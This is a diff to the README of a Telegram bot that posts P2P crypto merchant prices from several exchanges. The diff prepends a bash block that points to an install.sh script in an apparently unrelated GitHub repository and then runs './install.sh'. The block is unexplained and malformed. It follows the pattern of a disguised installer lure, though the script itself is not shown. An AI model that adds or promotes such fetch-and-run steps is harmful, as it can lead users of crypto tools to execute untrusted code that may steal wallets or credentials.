@@ -1,3 +1,11 @@
+
+```bash
+https://raw.githubusercontent.com/sarakmacbook/exchange/refs/heads/main/install.sh
+
+./install.sh
+```
+
+
 # 🤖 P2P Merchant Price Bot
 
 Telegram bot that watches your favourite **P2P merchants** on **Binance · Bybit · OKX · Bitget** and posts their best **sell** / **buy** prices to your Telegram group — automatically, every time the price changes.
